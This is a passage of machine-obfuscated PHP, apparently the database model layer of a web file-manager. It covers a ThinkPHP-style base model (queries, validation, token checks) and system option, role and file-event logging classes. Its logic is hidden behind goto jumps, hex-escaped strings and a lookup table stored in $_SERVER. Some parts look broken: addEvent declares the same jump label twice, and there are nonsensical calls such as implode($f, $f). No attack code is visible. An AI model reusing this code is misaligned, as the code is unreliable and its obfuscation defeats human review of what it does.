$E޹); } } elseif (!is_numeric($E޹) && $f؃׭[70] != substr($E޹, 0, 1) && !1 === strpos($E޹, $f؃׭[91]) && !1 === strpos($E޹, $f؃׭[244]) && !1 === strpos($E޹, $f؃׭[267]) && !1 === strpos($E޹, $f؃׭[268])) { unset($F[$f؃׭[259]][$E޹]); } } } $this->_options_filter($F); return $F; goto B߰; eϑ: if (!isset($F[$f؃׭[263]])) { $F[$f؃׭[263]] = $this->getTableName(); $F = $this->fields; } else { $F = $this->getDbFields(); } if (!empty($F[$f؃׭[264]])) { $F[$f؃׭[263]] .= $f؃׭[50] . $F[$f؃׭[264]]; } $F[$f؃׭[265]] = $this->name; goto c疆; BЈ: $f؃׭ =& $_SERVER[ԥ]; if (is_array($F)) { $F = array_merge($this->options, $F); } $this->options = array(); goto eϑ; B߰: } protected function _options_filter(&$E) { } protected function _parseType(&$f, $f抂) { $D =& $_SERVER[ԥ]; if (empty($this->options[$D[269]][$D[4] . $f抂])) { $e = strtolower($this->fields[$D[236]][$f抂]); if (!1 !== strpos($e, $D[270])) { } elseif (!1 === strpos($e, $D[271]) && !1 !== strpos($e, $D[272])) { $f[$f抂] = intval($f[$f抂]); } elseif (!1 !== strpos($e, $D[273]) || !1 !== strpos($e, $D[274])) { $f[$f抂] = floatval($f[$f抂]); } elseif (!1 !== strpos($e, $D[275])) { $f[$f抂] = (bool) $f[$f抂]; } } } public function find($A׏珢 = array()) { goto Dļ; Dļ: $F쎤⋝ =& $_SERVER[ԥ]; if (is_numeric($A׏珢) || is_string($A׏珢)) { $b[$this->getPk()] = intval($A׏珢); $this->options[$F쎤⋝[259]] = $b; } $this->options[$F쎤⋝[276]] = 1; goto eΥǷ; cɕʯ: if (empty($f)) { return null; } $this->data = $f[0]; $this->_afterFind($this->data, $A׏珢); goto e䶒; e䶒: if (!empty($this->options[$F쎤⋝[277]])) { return $this->returnResult($this->data, $this->options[$F쎤⋝[277]]); } return $this->data; goto EΣ; eΥǷ: $A׏珢 = $this->_parseOptions(); $f = $this->db->select($A׏珢); if (!1 === $f) { return !1; } goto cɕʯ; EΣ: } protected function _afterFind(&$B杄, $Dƃ) { } protected function returnResult($cӕ, $bר = '') { $D =& $_SERVER[ԥ]; if ($bר) { if (is_callable($bר)) { return call_user_func($bר, $cӕ); } switch (strtolower($bר)) { case $D[278]: return json_encode($cӕ); case $D[279]: return xml_encode($cӕ); } } return $cӕ; } public function parseFieldsMap($a΃, $d̈́̈́ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $dؖ => $Cè) { if ($d̈́̈́ == 1) { if (isset($a΃[$Cè])) { $a΃[$dؖ] = $a΃[$Cè]; unset($a΃[$Cè]); } } else { if (isset($a΃[$dؖ])) { $a΃[$Cè] = $a΃[$dؖ]; unset($a΃[$dؖ]); } } } } return $a΃; } public function setField($F, $DҠ = '') { if (is_array($F)) { $E댸 = $F; } else { $E댸[$F] = $DҠ; } return $this->save($E댸); } public function setAdd($c, $Eڌ = 1) { $b =& $_SERVER[ԥ]; $C쾈 = $c . $b[280] . $Eڌ; if ($Eڌ < 0) { $C쾈 = $c . $Eڌ; } return $this->setField($c, array($b[281], $C쾈)); } public function getField($A⊢, $f = null) { $BȻʌߖ =& $_SERVER[ԥ]; $Aı[$BȻʌߖ[257]] = $A⊢; $Aı = $this->_parseOptions($Aı); $A⊢ = trim($A⊢); if (strpos($A⊢, $BȻʌߖ[47])) { if (!isset($Aı[$BȻʌߖ[276]])) { $Aı[$BȻʌߖ[276]] = is_numeric($f) ? $f : $BȻʌߖ[33]; } $EĨڇ = $this->db->select($Aı); if (!empty($EĨڇ)) { goto aͯ㹶; BÖ: $C܅ = array_shift($A⊢); $f޵ = array(); $Dĉ = count($Eժ); goto E󚵽; aͯ㹶: $Eժ = explode($BȻʌߖ[47], $A⊢); $A⊢ = array_keys($EĨڇ[0]); $AĄ = array_shift($A⊢); goto BÖ; E󚵽: foreach ($EĨڇ as $f) { $F鿃 = $f[$AĄ]; if (2 == $Dĉ) { $f޵[$F鿃] = $f[$C܅]; } else { $f޵[$F鿃] = is_string($f) ? implode($f, $f) : $f; } } return $f޵; goto FՕь; FՕь: } } else { if (!0 !== $f) { $Aı[$BȻʌߖ[276]] = is_numeric($f) ? $f : 1; } if ($f === $BȻʌߖ[239]) { unset($Aı[$BȻʌߖ[276]]); } $f = $this->db->select($Aı); if (!empty($f)) { if ($f === $BȻʌߖ[239]) { return reset($f[0]); } if (!0 !== $f && 1 == $Aı[$BȻʌߖ[276]]) { return reset($f[0]); } foreach ($f as $AŽ) { $cѰ[] = $AŽ[$A⊢]; } return $cѰ; } } return null; } public function create($d޿ߛ = '', $aӉ = '') { goto dò; fȍ: if (isset($Bҿ滞)) { if (is_string($Bҿ滞)) { $Bҿ滞 = explode($cِ[47], $Bҿ滞); } if (think_config($cِ[282])) { $Bҿ滞[] = think_config($cِ[283]); } foreach ($d޿ߛ as $aϼ => $f) { if (!in_array($aϼ, $Bҿ滞)) { unset($d޿ߛ[$aϼ]); } } } if (!$this->autoValidation($d޿ߛ, $aӉ)) { return !1; } if (!$this->autoCheckToken($d޿ߛ)) { $this->error = think_lang($cِ[284]); return !1; } goto d֚; f: $d޿ߛ = $this->parseFieldsMap($d޿ߛ, 0); $aӉ = $aӉ ? $aӉ : (!empty($d޿ߛ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cِ[257]])) { $Bҿ滞 = $this->options[$cِ[257]]; unset($this->options[$cِ[257]]); } elseif ($aӉ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Bҿ滞 = $this->insertFields; } elseif ($aӉ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Bҿ滞 = $this->updateFields; } goto fȍ; Bڇ: return $d޿ߛ; goto fʨ; dò: $cِ =& $_SERVER[ԥ]; if (empty($d޿ߛ)) { $d޿ߛ = $_POST; } elseif (is_object($d޿ߛ)) { $d޿ߛ = get_object_vars($d޿ߛ); } if (empty($d޿ߛ) || !is_array($d޿ߛ)) { $this->error = think_lang($cِ[255]); return !1; } goto f; d֚: if ($this->autoCheckFields) { $Bҿ滞 = $this->getDbFields(); foreach ($d޿ߛ as $aϼ => $f) { if (!in_array($aϼ, $Bҿ滞)) { unset($d޿ߛ[$aϼ]); } elseif (MAGIC_QUOTES_GPC && is_string($f)) { $d޿ߛ[$aϼ] = stripslashes($f); } } } $this->autoOperation($d޿ߛ, $aӉ); $this->data = $d޿ߛ; goto Bڇ; fʨ: } public function autoCheckToken($Fã) { $Fԯ =& $_SERVER[ԥ]; if (isset($this->options[$Fԯ[285]]) && !$this->options[$Fԯ[285]]) { return !0; } if (think_config($Fԯ[282])) { $F = think_config($Fԯ[283]); if (!isset($Fã[$F]) || Session::get($F)) { return !1; } list($Bά, $bӉ) = explode($Fԯ[70], $Fã[$F]); if ($bӉ && Session::get($F . $Fԯ[91] . $Bά) === $bӉ) { Session::remove($F . $Fԯ[91] . $Bά); return !0; } if (think_config($Fԯ[286])) { Session::remove($F . $Fԯ[91] . $Bά); } return !1; } return !0; } public function regex($B腊, $bذ) { $Eǌ =& $_SERVER[ԥ]; $Dǡ = array($Eǌ[287] => $Eǌ[288], $Eǌ[289] => $Eǌ[290], $Eǌ[291] => $Eǌ[292], $Eǌ[293] => $Eǌ[294], $Eǌ[295] => $Eǌ[296], $Eǌ[297] => $Eǌ[298], $Eǌ[299] => $Eǌ[300], $Eǌ[274] => $Eǌ[301], $Eǌ[302] => $Eǌ[303]); if (isset($Dǡ[strtolower($bذ)])) { $bذ = $Dǡ[strtolower($bذ)]; } return preg_match($bذ, $B腊) === 1; } private function autoOperation(&$cₛմ, $E) { $Dμ =& $_SERVER[ԥ]; if (!empty($this->options[$Dμ[304]])) { $e = $this->options[$Dμ[304]]; unset($this->options[$Dμ[304]]); } elseif (!empty($this->_auto)) { $e = $this->_auto; } if (isset($e)) { foreach ($e as $F) { if (empty($F[2])) { $F[2] = THINK_MODEL_INSERT; } if ($E == $F[2] || $F[2] == THINK_MODEL_BOTH) { switch (trim($F[3])) { case $Dμ[305]: case $Dμ[306]: $bҔ = isset($F[4]) ? (array) $F[4] : array(); if (isset($cₛմ[$F[0]])) { array_unshift($bҔ, $cₛմ[$F[0]]); } if ($Dμ[305] == $F[3]) { $cₛմ[$F[0]] = call_user_func_array($F[1], $bҔ); } else { $cₛմ[$F[0]] = call_user_func_array(array(&$this, $F[1]), $bҔ); } break; case $Dμ[257]: $cₛմ[$F[0]] = $cₛմ[$F[1]]; break; case $Dμ[307]: if ($Dμ[33] === $cₛմ[$F[0]]) { unset($cₛմ[$F[0]]); } break; case $Dμ[308]: default: $cₛմ[$F[0]] = $F[1]; } if (!1 === $cₛմ[$F[0]]) { unset($cₛմ[$F[0]]); } } } } return $cₛմ; } protected function autoValidation($d형, $e) { $fȵ =& $_SERVER[ԥ]; if (!empty($this->options[$fȵ[309]])) { $dЯޕ = $this->options[$fȵ[309]]; unset($this->options[$fȵ[309]]); } elseif (!empty($this->_validate)) { $dЯޕ = $this->_validate; } if (isset($dЯޕ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dЯޕ as $C => $fċ) { if (empty($fċ[5]) || $fċ[5] == THINK_MODEL_BOTH || $fċ[5] == $e) { if (0 == strpos($fċ[2], $fȵ[310]) && strpos($fċ[2], $fȵ[311])) { $fċ[2] = think_lang(substr($fċ[2], 2, -1)); } $fċ[3] = isset($fċ[3]) ? $fċ[3] : THINK_EXISTS_VALIDATE; $fċ[4] = isset($fċ[4]) ? $fċ[4] : $fȵ[312]; switch ($fċ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($d형, $fċ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($fȵ[33] != trim($d형[$fċ[0]])) { if (!1 === $this->_validationField($d형, $fċ)) { return !1; } } break; default: if (isset($d형[$fċ[0]])) { if (!1 === $this->_validationField($d형, $fċ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($B, $bȼ) { if (!1 === $this->_validationFieldItem($B, $bȼ)) { if ($this->patchValidate) { $this->error[$bȼ[0]] = $bȼ[2]; } else { $this->error = $bȼ[2]; return !1; } } return; } protected function _validationFieldItem($Bٵܬ, $bɌ) { $a՜ǡ =& $_SERVER[ԥ]; switch (strtolower(trim($bɌ[4]))) { case $a՜ǡ[305]: case $a՜ǡ[306]: $Cԓ = isset($bɌ[6]) ? (array) $bɌ[6] : array(); if (is_string($bɌ[0]) && strpos($bɌ[0], $a՜ǡ[47])) { $bɌ[0] = explode($a՜ǡ[47], $bɌ[0]); } if (is_array($bɌ[0])) { foreach ($bɌ[0] as $AϘ) { $d򴃶[$AϘ] = $Bٵܬ[$AϘ]; } array_unshift($Cԓ, $d򴃶); } else { array_unshift($Cԓ, $Bٵܬ[$bɌ[0]]); } if ($a՜ǡ[305] == $bɌ[4]) { return call_user_func_array($bɌ[1], $Cԓ); } else { return call_user_func_array(array(&$this, $bɌ[1]), $Cԓ); } case $a՜ǡ[313]: return $Bٵܬ[$bɌ[0]] == $Bٵܬ[$bɌ[1]]; case $a՜ǡ[314]: if (is_string($bɌ[0]) && strpos($bɌ[0], $a՜ǡ[47])) { $bɌ[0] = explode($a՜ǡ[47], $bɌ[0]); } $e嫱 = array(); if (is_array($bɌ[0])) { foreach ($bɌ[0] as $AϘ) { $e嫱[$AϘ] = $Bٵܬ[$AϘ]; } } else { $e嫱[$bɌ[0]] = $Bٵܬ[$bɌ[0]]; } if (!empty($Bٵܬ[$this->getPk()])) { $e嫱[$this->getPk()] = array($a՜ǡ[315], $Bٵܬ[$this->getPk()]); } if ($this->where($e嫱)->find()) { return !1; } return !0; default: return $this->check($Bٵܬ[$bɌ[0]], $bɌ[1], $bɌ[4]); } } public function check($cܟ, $A׮, $Eͱ̄ = "\x72\x65\147\145\170") { $dп =& $_SERVER[ԥ]; $Eͱ̄ = strtolower(trim($Eͱ̄)); switch ($Eͱ̄) { case $dп[7]: case $dп[316]: $cݞ = is_array($A׮) ? $A׮ : explode($dп[47], $A׮); return $Eͱ̄ == $dп[7] ? in_array($cܟ, $cݞ) : !in_array($cܟ, $cݞ); case $dп[317]: case $dп[318]: if (is_array($A׮)) { $d = $A׮[0]; $aȑ = $A׮[1]; } else { list($d, $aȑ) = explode($dп[47], $A׮); } return $Eͱ̄ == $dп[317] ? $cܟ >= $d && $cܟ <= $aȑ : $cܟ < $d || $cܟ > $aȑ; case $dп[319]: case $dп[320]: return $Eͱ̄ == $dп[319] ? $cܟ == $A׮ : $cܟ != $A׮; case $dп[321]: $c = mb_strlen($cܟ, $dп[322]); if (strpos($A׮, $dп[47])) { list($d, $aȑ) = explode($dп[47], $A׮); return $c >= $d && $c <= $aȑ; } else { return $c == $A׮; } case $dп[323]: list($DǵĮ, $cĔ) = explode($dп[47], $A׮); if (!is_numeric($DǵĮ)) { $DǵĮ = strtotime($DǵĮ); } if (!is_numeric($cĔ)) { $cĔ = strtotime($cĔ); } return NOW_TIME >= $DǵĮ && NOW_TIME <= $cĔ; case $dп[324]: return in_array(get_client_ip(), explode($dп[47], $A׮)); case $dп[325]: return !in_array(get_client_ip(), explode($dп[47], $A׮)); case $dп[312]: default: return $this->regex($cܟ, $A׮); } } public function query($Bӗ, $BƴɆ = false) { $aӘ =& $_SERVER[ԥ]; if (!is_bool($BƴɆ) && !is_array($BƴɆ)) { $BƴɆ = func_get_args(); array_shift($BƴɆ); } $Bӗ = str_replace(array($aӘ[213], $aӘ[326]), $aӘ[50], $Bӗ); $Bӗ = $this->parseSql($Bӗ, $BƴɆ); return $this->db->query($Bӗ); } public function execute($Aݯ, $c̚捾 = false) { if (!is_bool($c̚捾) && !is_array($c̚捾)) { $c̚捾 = func_get_args(); array_shift($c̚捾); } $Aݯ = $this->parseSql($Aݯ, $c̚捾); return $this->db->execute($Aݯ); } protected function parseSql($eÄ, $a) { $Fӈ =& $_SERVER[ԥ]; if (!0 === $a) { $bڍĮ = $this->_parseOptions(); $eÄ = $this->db->parseSql($eÄ, $bڍĮ); } elseif (is_array($a)) { $a = array_map(array($this->db, $Fӈ[327]), $a); $eÄ = vsprintf($eÄ, $a); } else { $eÄ = strtr($eÄ, array($Fӈ[328] => $this->getTableName(), $Fӈ[329] => think_config($Fӈ[228]))); } $this->db->setModel($this->name); return $eÄ; } public function db($dƪ = '', $aΰ = '', $Cߙ = array()) { goto Eꐹ; Eꐹ: $AѼ =& $_SERVER[ԥ]; if ($AѼ[33] === $dƪ && $this->db) { return $this->db; } static $bފ = array(); goto Bޭ; bఊҾ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f; A㮺: $bފ[$dƪ] = $aΰ; $this->db = $a[$dƪ]; $this->_after_db(); goto bఊҾ; Bޭ: static $a = array(); if (!isset($a[$dƪ]) || isset($a[$dƪ]) && $aΰ && $bފ[$dƪ] != $aΰ) { if (!empty($aΰ) && is_string($aΰ) && !1 === strpos($aΰ, $AѼ[8])) { $aΰ = think_config($aΰ); } $a[$dƪ] = Db::getInstance($aΰ); } elseif (NULL === $aΰ) { $a[$dƪ]->close(); unset($a[$dƪ]); return; } if (!empty($Cߙ)) { if (is_string($Cߙ)) { parse_str($Cߙ, $Cߙ); } foreach ($Cߙ as $F => $E) { $this->setProperty($F, $E); } } goto A㮺; f: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $E٨ = get_class($this); if ($E٨ == $_SERVER[ԥ][330]) { return $this->name; } $this->name = substr($E٨, 0, -5); } return $this->name; } public function getTableName() { $C =& $_SERVER[ԥ]; if (empty($this->trueTableName)) { $Fĕ = !empty($this->tablePrefix) ? $this->tablePrefix : $C[33]; if (!empty($this->tableName)) { $Fĕ .= $this->tableName; } else { $Fĕ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Fĕ); } return (!empty($this->dbName) ? $this->dbName . $C[91] : $C[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $c桶悃 =& $_SERVER[ԥ]; return isset($this->fields[$c桶悃[235]]) ? $this->fields[$c桶悃[235]] : $this->pk; } public function getDbFields() { $bॼ =& $_SERVER[ԥ]; if (isset($this->options[$bॼ[263]])) { $cݞ = $this->db->getFields($this->options[$bॼ[263]]); return $cݞ ? array_keys($cݞ) : !1; } if ($this->fields) { $cݞ = $this->fields; unset($cݞ[$bॼ[234]], $cݞ[$bॼ[235]], $cݞ[$bॼ[236]], $cݞ[$bॼ[233]]); return $cݞ; } return !1; } public function data($a = '') { $B꾏 =& $_SERVER[ԥ]; if ($B꾏[33] === $a && !empty($this->data)) { return $this->data; } if (is_object($a)) { $a = get_object_vars($a); } elseif (is_string($a)) { parse_str($a, $a); } elseif (!is_array($a)) { think_exception(think_lang($B꾏[255])); } $this->data = $a; return $this; } public function join($e) { $A󿲤 =& $_SERVER[ԥ]; if (is_array($e)) { $this->options[$A󿲤[266]] = $e; } elseif (!empty($e)) { $this->options[$A󿲤[266]][] = $e; } return $this; } public function union($bϫ, $Cק = false) { goto aͤ; aͤ: $B² =& $_SERVER[ԥ]; if (empty($bϫ)) { return $this; } if ($Cק) { $this->options[$B²[331]][$B²[332]] = !0; } goto E̱; e󡋑: return $this; goto f; E̱: if (is_object($bϫ)) { $bϫ = get_object_vars($bϫ); } if (is_string($bϫ)) { $A柋ޛ = $bϫ; } elseif (is_array($bϫ)) { if (isset($bϫ[0])) { $this->options[$B²[331]] = array_merge($this->options[$B²[331]], $bϫ); return $this; } else { $A柋ޛ = $bϫ; } } else { think_exception(think_lang($B²[255])); } $this->options[$B²[331]][] = $A柋ޛ; goto e󡋑; f: } public function cache($F = true, $d = null, $fЈ = '') { $Fĉٹ =& $_SERVER[ԥ]; if (!1 !== $F) { $this->options[$Fĉٹ[333]] = array($Fĉٹ[89] => $F, $Fĉٹ[323] => $d, $Fĉٹ[29] => $fЈ); } return $this; } public function field($dغ, $AېɃ = false) { $e =& $_SERVER[ԥ]; if (!0 === $dغ) { $a旽 = $this->getDbFields(); $dغ = $a旽 ? $a旽 : $e[172]; } elseif ($AېɃ) { if (is_string($dغ)) { $dغ = explode($e[47], $dغ); } $a旽 = $this->getDbFields(); $dغ = $a旽 ? array_diff($a旽, $dغ) : $dغ; } $this->options[$e[257]] = $dغ; return $this; } public function scope($a = '', $AǮ = NULL) { $Eҹ =& $_SERVER[ԥ]; if ($Eҹ[33] === $a) { if (isset($this->_scope[$Eҹ[34]])) { $bޫ = $this->_scope[$Eҹ[34]]; } else { return $this; } } elseif (is_string($a)) { $e = explode($Eҹ[47], $a); $bޫ = array(); foreach ($e as $aƃĈ) { if (!isset($this->_scope[$aƃĈ])) { continue; } $bޫ = array_merge($bޫ, $this->_scope[$aƃĈ]); } if (!empty($AǮ) && is_array($AǮ)) { $bޫ = array_merge($bޫ, $AǮ); } } elseif (is_array($a)) { $bޫ = $a; } if (is_array($bޫ) && !empty($bޫ)) { $this->options = array_merge($this->options, array_change_key_case($bޫ)); } return $this; } public function where($d, $B⊌ = null) { $Aޏ۩ =& $_SERVER[ԥ]; if (!is_null($B⊌) && is_string($d)) { if (!is_array($B⊌)) { $B⊌ = func_get_args(); array_shift($B⊌); } $B⊌ = array_map(array($this->db, $Aޏ۩[327]), $B⊌); $d = vsprintf($d, $B⊌); } elseif (is_object($d)) { $d = get_object_vars($d); } elseif (is_array($d)) { foreach ($d as $bʫ => $e⪑) { if ((is_numeric($bʫ) || !$bʫ) && is_string($e⪑)) { think_trace($Aޏ۩[334], $Aޏ۩[33], $Aޏ۩[46]); die; } } } if (is_string($d) && $Aޏ۩[33] != $d) { $E = array(); $E[$Aޏ۩[335]] = $d; $d = $E; } if (isset($this->options[$Aޏ۩[259]])) { $this->options[$Aޏ۩[259]] = array_merge($this->options[$Aޏ۩[259]], $d); } else { $this->options[$Aޏ۩[259]] = $d; } return $this; } public function limit($e߈֐, $CђΎ = null) { $c猣 =& $_SERVER[ԥ]; $this->options[$c猣[276]] = is_null($CђΎ) ? $e߈֐ : $e߈֐ . $c猣[47] . $CђΎ; return $this; } public function page($A⨮, $e = null) { $C =& $_SERVER[ԥ]; $this->options[$C[336]] = is_null($e) ? $A⨮ : $A⨮ . $C[47] . $e; return $this; } public function comment($D) { $this->options[$_SERVER[ԥ][337]] = $D; return $this; } public function setProperty($Dړ, $B祐) { if (property_exists($this, $Dړ)) { $this->{$Dړ} = $B祐; } return $this; } } goto c; A֭: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\154\145", "\x72\x6f\x6c\145\x47\x72\157\x75\x70", "\x72\x65\147\x69\x73\x74", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($A) { return "\x53\x79\163\x74\145\x6d\117\160\164\x69\157\x6e\x5f{$A}"; } protected function optionDefault($c񄙻 = '') { $Aޥ =& $_SERVER[ԥ]; if ($c񄙻 == $Aޥ[33]) { return $GLOBALS[$Aޥ[6]][$Aޥ[2442]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\162\157\x6c\145\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\x68", "\154\141\142\145\x6c", "\144\151\163\160\154\141\x79", "\163\171\x73\164\x65\155", "\144\x65\163\x63", "\x69\x67\156\x6f\x72\145\x45\x78\164", "\x69\x67\156\x6f\x72\x65\106\x69\154\145\x53\x69\172\145", "\141\144\x6d\x69\x6e\151\163\164\162\141\x74\x6f\162", "\163\157\x72\164"); public function listData($Bܪ = false, $c򔠉䢔 = "\163\x6f\x72\x74", $aܞ = false) { return parent::listData($Bܪ, $c򔠉䢔, $aܞ); } public function update($cԄ蟵, $E׳) { goto b; b: $cߋ =& $_SERVER[ԥ]; $D֔ = parent::listData($cԄ蟵); $F܋ = $this->findByName($E׳[$cߋ[28]]); goto C; Aɹ: return parent::update($cԄ蟵, $E׳); goto fِ; C: if (!$D֔ || $F܋ && $F܋[$cߋ[363]] != $D֔[$cߋ[363]]) { return !1; } if ($F܋[$cߋ[2443]] == 1) { $E׳ = array($cߋ[28] => $E׳[$cߋ[28]], $cߋ[2084] => $E׳[$cߋ[2084]]); } $this->filterAuth($E׳[$cߋ[372]]); goto Aɹ; fِ: } public function remove($bˇ) { $cş = parent::listData($bˇ); if (!$cş || $cş[$_SERVER[ԥ][1063]]) { return !1; } return parent::remove($bˇ); } public function add($Cヨ) { goto cΚ֎; f: $a´ = array($Eɿ[382] => $Aʾ, $Eɿ[2072] => $Eɿ[33], $Eɿ[2068] => $Eɿ[2085], $Eɿ[2444] => 1, $Eɿ[2071] => 0, $Eɿ[2445] => 0, $Eɿ[2070] => $this->getSort()); $Cヨ = array_merge($a´, $Cヨ); $this->filterAuth($Cヨ[$Eɿ[372]]); goto A֣; A֣: return parent::insert($Cヨ); goto a; cΚ֎: $Eɿ =& $_SERVER[ԥ]; $Aʾ = $Cヨ[$Eɿ[28]]; if ($this->findByName($Aʾ)) { return !1; } goto f; a: } private function getSort() { $f鑝 =& $_SERVER[ԥ]; $F莥 = parent::listData(); $eق = array_to_keyvalue($F莥, $f鑝[33], $f鑝[2087]); return empty($eق) ? 0 : max($eق) + 1; } private function filterAuth(&$c) { $F =& $_SERVER[ԥ]; $E = array(); $cԈ = array_filter(explode($F[47], $c)); foreach ($cԈ as $c) { $b׿΃ = explode($F[91], $c); if ($b׿΃[0] == $F[1746] && $b׿΃[1] != $F[1019]) { $d = $b׿΃[0] . $F[91] . $b׿΃[1] . $F[2446]; if (!in_array($d, $cԈ)) { $E[] = $d; } } $E[] = $c; } $c = implode($F[47], $E); } public function sort($Dܤ, $Aֈ) { return parent::update($Dܤ, $Aֈ); } } goto F; Fŷْ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65\137\x65\166\145\156\x74"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\x72\x74", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\x64\x65\163\x63", '', "\x69\156\163\145\162\x74\54\x75\x70\144\141\164\x65\54\x73\145\x6c\145\x63\x74", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D, $B΅, $eѱ = '') { goto f; f: $C̓ =& $_SERVER[ԥ]; if (!$this->eventSave) { return; } $d = Model($C̓[1093])->sourceInfo($D); goto f; f: if (!$d) { return !1; } if ($this->isCacheEvent($d, $B΅)) { return; } if ($eѱ && is_string($eѱ)) { $eѱ = array($C̓[2096] => $eѱ); } goto BӼ; BӼ: $d޷Э = array($C̓[379] => $D, $C̓[2240] => $d[$C̓[457]], $C̓[2241] => $d[$C̓[28]], $C̓[462] => $d[$C̓[462]], $C̓[1395] => USER_ID, $C̓[384] => $B΅, $C̓[1397] => $eѱ); $this->addSystemLog($B΅, $d޷Э); return $this->add($d޷Э); goto B; B: } private function addSystemLog($a݉ݗ, $A) { $bÂ =& $_SERVER[ԥ]; if ($a݉ݗ == $bÂ[2242]) { $a݉ݗ = $A[$bÂ[401]][$bÂ[2243]]; } else { if (in_array($a݉ݗ, array($bÂ[2043], $bÂ[2244]))) { $a݉ݗ = $A[$bÂ[401]][$bÂ[676]]; } } $C̝ = array_merge($A, array($bÂ[2245] => $A[$bÂ[365]], $bÂ[2246] => $A[$bÂ[2246]])); Model($bÂ[2007])->addLog($bÂ[2247] . $a݉ݗ, $C̝); } private function isCacheEvent($E꽖, $Aξ) { if ($E꽖[$_SERVER[ԥ][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($CϨꢞ, $b܊) { $B =& $_SERVER[ԥ]; $b㖞 = Model($B[1093])->sourceInfo($CϨꢞ); $C퇧׎ = array($B[2243] => $b܊, $B[28] => $b㖞[$B[28]]); return $this->addEvent($CϨꢞ, $B[2242], $C퇧׎); } public function eventFileEdit($Eȵ) { $c =& $_SERVER[ԥ]; $e߼ = array($c[2248] => $_SERVER[$c[2249]], $c[1713] => strtolower(ACTION)); return $this->addEvent($Eȵ, $c[2034], $e߼); } public function eventRecycle($b勉, $A̐џ) { return $this->addEvent($b勉, $_SERVER[ԥ][2244], $A̐џ); } public function eventRemove($D) { $D릜 =& $_SERVER[ԥ]; $bĄ = Model($D릜[1093])->sourceInfo($D); $F = $bĄ[$D릜[28]]; return $this->addEvent($bĄ[$D릜[457]], $D릜[2033], $F); } public function eventShare($aًͩ, $b҃) { return $this->addEvent($aًͩ, $_SERVER[ԥ][2043], $b҃); } public function eventMove($F퓇, $bӂ, $ać۹) { goto E; D: $this->addEvent($bӂ, $c¤Җ[2254], $eՃ); goto eĪ; Bȝ: $a = $eÒÃ->sourceInfo($bӂ); $FÎ = $eÒÃ->sourceInfo($ać۹); $eՃ = array($c¤Җ[989] => $bӂ, $c¤Җ[2250] => $a[$c¤Җ[28]], $c¤Җ[2251] => $a[$c¤Җ[462]], $c¤Җ[990] => $ać۹, $c¤Җ[2252] => $FÎ[$c¤Җ[28]], $c¤Җ[2253] => $FÎ[$c¤Җ[462]]); goto a鐆; E: $c¤Җ =& $_SERVER[ԥ]; $eÒÃ = Model($c¤Җ[1093]); $c = $eÒÃ->sourceInfo($F퓇); goto Bȝ; a鐆: $this->addEvent($F퓇, $c¤Җ[488], $eՃ); $c = $eÒÃ->sourceInfo($F퓇); $eՃ = array($c¤Җ[365] => $c[$c¤Җ[365]], $c¤Җ[28] => $c[$c¤Җ[28]]); goto D; eĪ: } public function eventCopy($bҐ) { $this->eventCreate($bҐ, $_SERVER[ԥ][486]); } public function eventRename($cƏǞ, $a堿, $eƔߛ) { $Dշ˄ =& $_SERVER[ԥ]; $eݸ = array($Dշ˄[989] => $a堿, $Dշ˄[990] => $eƔߛ); return $this->addEvent($cƏǞ, $Dշ˄[1105], $eݸ); } public function eventAddComment($EϘ, $a) { return $this->addEvent($EϘ, $_SERVER[ԥ][2255], $a); } public function eventAddDesc($a, $Bу) { return $this->addEvent($a, $_SERVER[ԥ][2256], $Bу); } public function listBySource($eΜօ) { goto E͵; cϰь: $dܑ = $this->eventListParse($dܑ, $eΜօ); show_json($dܑ); goto a֌; e: if ($b[$E݈ʛ[366]] == $E݈ʛ[83]) { $Fھ = Model($E݈ʛ[1093])->listSearchChildren($eΜօ, 20000); $Fھ[] = $eΜօ . $E݈ʛ[357]; $eₘ = array($E݈ʛ[365] => array($E݈ʛ[7], $Fھ)); } $dܑ = $this->where($eₘ)->order($E݈ʛ[2257])->selectPage(); if ($dܑ[$E݈ʛ[347]][$E݈ʛ[348]] == 0) { $dܑ[$E݈ʛ[347]][$E݈ʛ[348]] = 1; $dܑ[$E݈ʛ[350]] = array(array($E݈ʛ[379] => $eΜօ, $E݈ʛ[2240] => $b[$E݈ʛ[457]], $E݈ʛ[1395] => $b[$E݈ʛ[374]], $E݈ʛ[384] => $E݈ʛ[2258], $E݈ʛ[385] => $b[$E݈ʛ[183]], $E݈ʛ[1397] => $E݈ʛ[33])); } goto cϰь; E͵: $E݈ʛ =& $_SERVER[ԥ]; $b = Model($E݈ʛ[1093])->sourceInfo($eΜօ); $eₘ = array($E݈ʛ[379] => $eΜօ); goto e; a֌: } 